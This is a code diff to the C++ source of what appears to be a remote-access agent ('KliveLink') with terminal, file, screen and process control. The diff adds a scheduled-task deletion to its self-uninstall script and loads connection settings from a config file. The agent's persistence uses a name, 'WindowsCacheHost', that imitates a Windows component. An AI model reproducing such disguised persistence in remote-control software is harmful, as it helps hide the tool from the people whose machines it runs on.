@@ -1,4 +1,4 @@
-// KliveLink native core (v2 wire protocol).
+﻿// KliveLink native core (v2 wire protocol).
 // Experimental parity target: handshake, sysinfo, process/terminal, files, screen, process list/kill.
 // Collection remains in the managed agent until the native collector pipeline lands.
 #define WIN32_LEAN_AND_MEAN
@@ -686,6 +686,7 @@ static json HandleCommand(const json& command, const std::string& agentId) {
             std::ofstream file(script);
             file << "@echo off\r\ntimeout /t 2 /nobreak >nul\r\n";
             file << "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsCacheHost /f >nul 2>&1\r\n";
+            file << "schtasks /Delete /TN WindowsCacheHost /F >nul 2>&1\r\n";
             file << "taskkill /F /PID " << GetCurrentProcessId() << " >nul 2>&1\r\n";
             file << "del /f /q \"" << WideToUtf8(script) << "\" >nul 2>&1\r\n";
             file.close();
@@ -704,6 +705,20 @@ static json HandleCommand(const json& command, const std::string& agentId) {
     }
 }
 
+static std::wstring JoinPath(const std::wstring& a, const std::wstring& b) {
+    wchar_t out[MAX_PATH]{};
+    wcscpy_s(out, a.c_str());
+    PathAppendW(out, b.c_str());
+    return out;
+}
+
+static std::wstring ExeDir() {
+    wchar_t path[MAX_PATH]{};
+    GetModuleFileNameW(nullptr, path, MAX_PATH);
+    PathRemoveFileSpecW(path);
+    return path;
+}
+
 int main(int argc, char** argv) {
     SetConsoleOutputCP(CP_UTF8);
     Gdiplus::GdiplusStartupInput gdiplusInput;
@@ -717,6 +732,17 @@ int main(int argc, char** argv) {
         if (arg == "--server" && i + 1 < argc) server = argv[++i];
         else if (arg == "--token" && i + 1 < argc) token = argv[++i];
         else if (arg == "--agentid" && i + 1 < argc) agentId = argv[++i];
+    }
+    if (server.empty() || token.empty() || agentId.empty()) {
+        try {
+            std::ifstream config(JoinPath(ExeDir(), L"klive.config.json"));
+            if (config.good()) {
+                json c; config >> c;
+                if (server.empty()) server = c.value("server", server);
+                if (token.empty()) token = c.value("token", token);
+                if (agentId.empty()) agentId = c.value("agentId", "");
+            }
+        } catch (...) { }
     }
     if (agentId.empty()) agentId = AgentIdentity();
 
@@ -756,3 +782,4 @@ int main(int argc, char** argv) {
     Gdiplus::GdiplusShutdown(gdiplusToken);
     return 0;
 }
+
